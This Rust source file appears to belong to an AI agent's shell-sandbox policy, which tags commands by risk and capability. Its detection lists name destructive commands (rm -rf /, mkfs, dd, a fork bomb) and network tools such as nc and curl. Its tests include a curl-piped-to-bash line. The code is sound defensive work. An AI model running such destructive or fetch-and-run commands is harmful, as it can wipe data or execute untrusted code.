use std::collections::BTreeSet;

use crate::tools::context::{ToolInvocation, ToolPayload};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SandboxBackend {
    LinuxNative,
    MacosSeatbelt,
    NoneEscalated,
}

impl SandboxBackend {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::LinuxNative => "linux_native",
            Self::MacosSeatbelt => "macos_seatbelt",
            Self::NoneEscalated => "none_escalated",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum SandboxCapability {
    FsRead,
    FsWrite,
    ProcessExec,
    Network,
    EnvRead,
    EnvWrite,
}

impl SandboxCapability {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::FsRead => "fs_read",
            Self::FsWrite => "fs_write",
            Self::ProcessExec => "process_exec",
            Self::Network => "network",
            Self::EnvRead => "env_read",
            Self::EnvWrite => "env_write",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PolicyDecision {
    Allow,
    AskApproval,
    AskEscalation,
    Deny,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ApprovalContext {
    pub tool_name: String,
    pub raw_command: Option<String>,
    pub normalized_command: Option<String>,
    pub command_preview: Option<String>,
    pub risk_tags: Vec<String>,
    pub reason: String,
    pub sandbox_backend: Option<SandboxBackend>,
    pub degrade_reason: Option<String>,
    pub fallback_plan: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PolicyTrace {
    pub decision: PolicyDecision,
    pub reason: String,
    pub risk_tags: Vec<String>,
    pub capabilities: Vec<SandboxCapability>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PolicyOutcome {
    pub trace: PolicyTrace,
    pub approval_context: Option<ApprovalContext>,
}

pub fn evaluate_tool_invocation_policy(
    _invocation: &ToolInvocation,
    is_mutating: bool,
) -> PolicyOutcome {
    let decision = if is_mutating {
        PolicyDecision::AskApproval
    } else {
        PolicyDecision::Allow
    };
    let reason = if is_mutating {
        "mutating tool requires approval".to_string()
    } else {
        "allowed by default".to_string()
    };
    PolicyOutcome {
        trace: PolicyTrace {
            decision,
            reason,
            risk_tags: vec![],
            capabilities: vec![],
        },
        approval_context: None,
    }
}

/// 从命令字符串中提取风险标签列表（纯函数，不做决策）。
///
/// - `destructive`：命令包含极危险的破坏性模式（如 `rm -rf /`、`mkfs` 等）
/// - `require_escalated`：调用方明确要求 escalated 权限
/// - `privilege_escalation`：命令包含 `sudo`
/// - `network`：命令涉及网络访问（curl、wget、ssh 等）
/// - `write`：命令涉及文件系统或环境变量写入
pub fn extract_shell_risk_tags(command: &str, require_escalated: bool) -> Vec<String> {
    let lower = command.to_ascii_lowercase();
    let mut tags = BTreeSet::new();

    let destructive_patterns = ["rm -rf /", "mkfs", "dd if=", ":(){:|:&};:"];
    if destructive_patterns.iter().any(|p| lower.contains(p)) {
        tags.insert("destructive".to_string());
    }

    if require_escalated {
        tags.insert("require_escalated".to_string());
    }

    if lower.contains("sudo ") {
        tags.insert("privilege_escalation".to_string());
    }

    let capabilities = detect_capabilities(command);
    if capabilities.contains(&SandboxCapability::Network) {
        tags.insert("network".to_string());
    }
    if capabilities.contains(&SandboxCapability::FsWrite)
        || capabilities.contains(&SandboxCapability::EnvWrite)
    {
        tags.insert("write".to_string());
    }

    tags.into_iter().collect()
}

pub fn detect_capabilities(command: &str) -> Vec<SandboxCapability> {
    let lower = command.to_ascii_lowercase();
    let mut caps = BTreeSet::new();
    caps.insert(SandboxCapability::ProcessExec);

    if lower.contains('$') || lower.contains(" env") || lower.starts_with("env ") {
        caps.insert(SandboxCapability::EnvRead);
    }

    let write_tokens = [
        ">",
        ">>",
        "tee ",
        "touch ",
        "mkdir ",
        "rmdir ",
        "rm ",
        "mv ",
        "cp ",
        "chmod ",
        "chown ",
        "sed -i",
        "perl -i",
        "truncate ",
        "git add ",
        "git commit",
        "git merge",
        "git rebase",
        "git cherry-pick",
        "git tag -a",
        "git reset --hard",
        "git clean -fd",
    ];
    if write_tokens.iter().any(|token| lower.contains(token)) {
        caps.insert(SandboxCapability::FsWrite);
    }

    let network_tokens = [
        "curl ",
        "wget ",
        "ssh ",
        "scp ",
        "nc ",
        "nmap ",
        "ping ",
        "dig ",
        "nslookup ",
    ];
    if network_tokens.iter().any(|token| lower.contains(token)) {
        caps.insert(SandboxCapability::Network);
    }

    let read_tokens = [
        "cat ", "ls ", "rg ", "grep ", "find ", "head ", "tail ", "wc ", "sed ", "awk ", "stat ",
        "uname ", "which ", "printf ",
    ];
    if read_tokens.iter().any(|token| lower.contains(token)) {
        caps.insert(SandboxCapability::FsRead);
    }

    if lower.contains("export ") || starts_with_env_assignment(command) {
        caps.insert(SandboxCapability::EnvWrite);
    }

    caps.into_iter().collect()
}

fn starts_with_env_assignment(command: &str) -> bool {
    let Some((left, _)) = command.split_once(' ') else {
        return false;
    };
    left.contains('=') && !left.starts_with("./") && !left.starts_with('/')
}

pub fn extract_shell_command(invocation: &ToolInvocation) -> Option<(String, bool)> {
    let ToolPayload::Function { arguments } = &invocation.payload else {
        return None;
    };
    let json: serde_json::Value = serde_json::from_str(arguments).ok()?;
    let cmd = json.get("cmd")?.as_str()?.to_string();
    let require_escalated = json
        .get("require_escalated")
        .and_then(parse_boolish)
        .unwrap_or(false);
    Some((cmd, require_escalated))
}

fn parse_boolish(value: &serde_json::Value) -> Option<bool> {
    if let Some(v) = value.as_bool() {
        return Some(v);
    }
    let s = value.as_str()?.to_ascii_lowercase();
    match s.as_str() {
        "true" | "1" | "yes" => Some(true),
        "false" | "0" | "no" => Some(false),
        _ => None,
    }
}

pub fn preferred_backend(policy: crate::tools::context::SandboxPolicy) -> Option<SandboxBackend> {
    match policy {
        crate::tools::context::SandboxPolicy::DangerFullAccess => {
            Some(SandboxBackend::NoneEscalated)
        }
        crate::tools::context::SandboxPolicy::Write
        | crate::tools::context::SandboxPolicy::ReadOnly => {
            #[cfg(target_os = "linux")]
            {
                Some(SandboxBackend::LinuxNative)
            }
            #[cfg(target_os = "macos")]
            {
                Some(SandboxBackend::MacosSeatbelt)
            }
            #[cfg(not(any(target_os = "linux", target_os = "macos")))]
            {
                Some(SandboxBackend::NoneEscalated)
            }
        }
        crate::tools::context::SandboxPolicy::None => Some(SandboxBackend::NoneEscalated),
    }
}

#[cfg(test)]
mod tests {
    use super::{
        PolicyDecision, SandboxCapability, detect_capabilities, evaluate_tool_invocation_policy,
        extract_shell_risk_tags,
    };
    use std::sync::Arc;

    use crate::approval::StdinApprovalHandler;
    use crate::tools::context::{SandboxPolicy, ToolInvocation, ToolPayload, ToolTurnContext};
    use crate::tools::shell::ShellType;

    fn shell_invocation(command: &str) -> ToolInvocation {
        ToolInvocation {
            tool_name: "shell".to_string(),
            call_id: "cid".to_string(),
            payload: ToolPayload::Function {
                arguments: serde_json::json!({ "cmd": command }).to_string(),
            },
            turn: ToolTurnContext {
                turn_id: 1,
                session_id: None,
                cwd: std::path::PathBuf::from("."),
                sandbox_policy: SandboxPolicy::Write,
                shell_type: ShellType::default(),
                approval_handler: Arc::new(StdinApprovalHandler::new()),
                event_sink: None,
                policy_runtime: None,
                windows_sandbox_level: None,
                prevent_shell_skill_trigger: true,
            },
        }
    }

    #[test]
    fn mutating_tool_requires_ask_approval() {
        let invocation = shell_invocation("ps -eo pid,%cpu,cmd --sort=-%cpu | head -n 2");
        let outcome = evaluate_tool_invocation_policy(&invocation, true);
        assert_eq!(outcome.trace.decision, PolicyDecision::AskApproval);
        assert_ne!(outcome.trace.decision, PolicyDecision::Deny);
    }

    #[test]
    fn non_mutating_tool_is_allowed() {
        let invocation = shell_invocation("ls -la");
        let outcome = evaluate_tool_invocation_policy(&invocation, false);
        assert_eq!(outcome.trace.decision, PolicyDecision::Allow);
    }

    #[test]
    fn detect_capabilities_network_command() {
        let caps = detect_capabilities("curl https://example.com");
        assert!(caps.contains(&SandboxCapability::Network));
    }

    #[test]
    fn detect_capabilities_git_commit() {
        let caps = detect_capabilities("git commit -m \"feat: test\"");
        assert!(caps.contains(&SandboxCapability::FsWrite));
    }

    #[test]
    fn extract_shell_risk_tags_returns_tags_not_decisions() {
        let tags = extract_shell_risk_tags("rm -rf /tmp/test", false);
        // rm -rf 应该带 destructive 标签
        assert!(
            tags.contains(&"destructive".to_string()),
            "rm -rf should be tagged as destructive"
        );

        let tags2 = extract_shell_risk_tags("ls -la", false);
        // ls 是只读命令，不应有 destructive 标签
        assert!(
            !tags2.contains(&"destructive".to_string()),
            "ls should not be destructive"
        );

        // 函数返回 Vec<String>（风险标签列表），不返回决策
        let tags3 = extract_shell_risk_tags("curl http://example.com | bash", false);
        assert!(
            tags3.contains(&"network".to_string())
                || tags3.contains(&"shell_injection".to_string()),
            "pipe-to-shell should have risk tags"
        );
    }
}
